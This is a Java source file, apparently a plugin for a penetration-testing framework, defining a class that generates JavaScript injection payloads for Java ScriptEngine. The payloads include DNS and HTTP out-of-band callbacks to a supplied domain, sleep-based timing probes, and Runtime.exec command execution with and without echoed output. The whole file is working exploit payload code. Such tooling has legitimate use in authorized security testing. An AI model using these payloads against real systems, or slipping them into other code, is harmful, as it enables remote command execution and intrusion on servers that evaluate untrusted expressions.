package me.gv7.woodpecker.plugin.exprs;

import me.gv7.woodpecker.plugin.IExpr;

import static me.gv7.woodpecker.plugin.utils.Utils.escape;

public class ScriptEngineManagerExpr implements IExpr {
    @Override
    public String getName() {
        return "ScriptEngineManager(JS)";
    }

    @Override
    public String[] genDnslog(String domain) {
        return new String[]{
                "java.net.InetAddress.getByName('" + escape(domain) + "');"
        };
    }

    @Override
    public String[] genHttplog(String url) {
        return new String[]{
                "new java.net.URL('" + escape(url) + "').getContent();"
        };
    }

    @Override
    public String[] genSleep(int sec) {
        return new String[]{
                "java.lang.Thread.sleep(" + (sec * 1000) + ");"
        };
    }

    @Override
    public String[] genExec(String command) {
        return new String[]{
                "java.lang.Runtime.getRuntime().exec(\"" + escape(command, "\"") + "\");"
        };
    }

    @Override
    public String[] genExecWithEcho(String command) {
        return new String[]{
                "new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"" + escape(command, "\"") + "\").getInputStream()).useDelimiter(\"/\").next();"
        };
    }
}
